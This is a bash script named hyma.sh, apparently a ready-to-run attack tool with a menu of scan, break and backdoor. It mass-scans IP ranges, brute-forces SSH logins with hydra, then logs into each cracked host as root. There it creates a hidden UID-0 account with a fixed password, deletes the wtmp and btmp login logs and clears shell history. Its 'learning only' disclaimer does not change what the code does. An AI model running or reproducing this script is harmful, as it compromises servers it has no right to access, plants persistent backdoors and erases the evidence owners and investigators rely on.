#!/bin/bash
#name:hyma.sh
#author:Driver_C
#blog:http://chenjingyu.cn/
#version:3.2.3
#This script needs to install "masscan,hydra,expect"
#This script is only for learning and communication, not for illegal purposes.
#2017-07-05
#ENV:CentOS6,CentOS7

echo 'This script is only for learning and communication, not for illegal purposes.                   --Driver_C'
echo 'Bugs to driver_c@foxmail.com'

#tools check
VERSION=`cat /etc/centos-release | egrep -o "[0-9]\.[0-9]" | cut -d'.' -f1`
if [ "$VERSION" = "7" ];then
	[[ ! -e /usr/bin/hydra ]] && CHECK=1
	[[ ! -e /usr/bin/masscan ]] && CHECK=1
	[[ ! -e /usr/bin/expect ]] && CHECK=1
else
	[[ ! -e /usr/bin/hydra ]] && CHECK=1
	[[ ! -e /usr/bin/nmap ]] && CHECK=1
	[[ ! -e /usr/bin/expect ]] && CHECK=1
fi

#mod fuctions

fun_scan7() {
masscan "$SCANVALUE" -p"$PORTVALUE" | cut -d' ' -f6 > /root/ip.txt
}

fun_scan6() {
nmap -n --open -p "$PORTVALUE" "$SCANVALUE" | grep 'report for' | cut -d' ' -f5 > /root/ip.txt
echo 'There are' `wc -l /root/ip.txt | cut -d' ' -f1` 'ips.'
}

fun_scan() {
read -p 'Input a ip area,example:10.0.0.0/8 :' SCANVALUE

while [[ ! "$SCANVALUE" =~ ([0-9]{1,3}.){1,3}[0-9]{1,3}/[0-9]{1,2} ]];do
read -p 'Wrong parameter.Input again,example:10.0.0.0/8 :' SCANVALUE
done

read -p 'Input the port you want to scan:' PORTVALUE

while [[ ! "$PORTVALUE" =~ [0-9]{1,5} ]];do
read -p 'Wrong port number,input again:' PORTVALUE
done

echo "The scan will begin in 3 seconds."
sleep 3
echo "Just wait."

if [ "$VERSION" = "7" ];then
	fun_scan7
else
	fun_scan6
fi

echo "Scan complete.The iplist to /root/ip.txt"
sleep 1
}


fun_break() {
echo 'Just for 22 port.'
echo "Tip: if the blasting is not started normally,please make sure that there are users.txt and passwords.txt in the path /root."
sleep 3
echo
echo "Just wait."
sleep 2

> /root/save.log

hydra -L /root/users.txt -P /root/passwords.txt -t 64 -vV -e ns -o /root/save.log -M /root/ip.txt ssh

echo "Brute force complete."
sleep 1

egrep "login:.*password:" /root/save.log | tr ':' ' '  | tr -s ' ' | cut -d' ' -f3,7 | sort > /root/chicken.txt  

echo "The chicken list /root/chicken.txt"
}

fun_backdoor() {
echo 'Just for 22 port.'
sleep 2
echo "Just wait."
sleep 2

/usr/bin/expect<<EOF
set f [open /root/chicken.txt r]
while { [gets \$f line ]>=0 } {
set ip [lindex \$line 0]
set pwd [lindex \$line 1]
spawn ssh -l root \$ip
 expect {
"not know" {send_user "[exec echo \"not know\"]";exit}
"(yes/no)?" {send "yes\r";exp_continue}
"password:" {send  "\$pwd\r"}
"Permission denied, please try again." { send_user "[exec echo \"Error:Password is wrong\"]";exit }
}
set timeout 1
expect "]# "
send "useradd -u0 -o -g0 hyma\r"
send "echo qwerasdf1234 | passwd --stdin hyma\r"
send "rm -f /var/log/{wtmp*,btmp*}\r"
send "touch /var/log/{wtmp,btmp}\r"
send "history -c\r"
send "exit\r"
expect eof
}
close \$f
EOF
}

fun_install() {
touch /etc/yum.repos.d/al.repo
cat << EOF > /etc/yum.repos.d/al.repo
[base]
name=base
baseurl=http://mirrors.aliyun.com/centos/\$releasever/os/\$basearch/
gpgcheck=0

[epel]
name=epel
baseurl=https://mirrors.aliyun.com/epel/$VERSION/x86_64/
gpgcheck=0
EOF

yum clean all
if [ "$VERSION" = "7" ];then
	yum install -y hydra masscan expect
else
	yum install -y hydra nmap expect
fi
}


#head of the script
echo 'Checking tools,just wait.'
for i in {1..20};do
	echo -n '='
	sleep 0.05
done

echo

if [ -n "$CHECK" ];then
	echo 'Complete,some tools not found.'
	sleep 1
	read -p 'Do you want to install those tools?(y or n)' INSTALL
	if [ "$INSTALL" = "y" ];then
        	fun_install
		if [ "$?" = "1" ];then
			echo 'Install failed,check your yum.repo.'
			exit
		fi
			
	else
        	echo 'This script is only for learning and communication, not for illegal purposes.                   --Driver_C'
        	unset CHECK
		exit
	fi
	echo 'Install complete.'
else
	echo 'Complete,tools can support this script.'
fi

echo 'Version:3.2.3'
echo '-------hyma menu-------'
echo '|    1 is scan        |'
echo '|    2 is break       |'
echo '|    3 is backdoor    |'
echo '|    q to quit        |'
echo '-----------------------'

read -p 'Input the numbers in the menu:' MENU
[ "$MENU" = "q" ] && echo 'This script is only for learning and communication, not for illegal purposes.                   --Driver_C' && exit
while [[ ! "$MENU" =~ [1-3]{1,3} ]];do
read -p 'Wrong numbers.Input the numbers on menu in sequence.' MENU
done

case "$MENU" in
1)
	fun_scan
	;;
2)
	fun_break
	;;
3)
	fun_backdoor
	;;
12|21)
	fun_scan
	fun_break
	;;
123|132|213|231|312|321)
	fun_scan
	fun_break
	fun_backdoor
	;;
*)
	echo 'Wrong numbers.Input the numbers on menu in sequence.'
	break
	;;
esac

unset line pwd ip f SCANVALUE MENU PORTVALUE CHECK INSTALL VERSION

echo "This script is only for learning and communication, not for illegal purposes.                   --Driver_C"
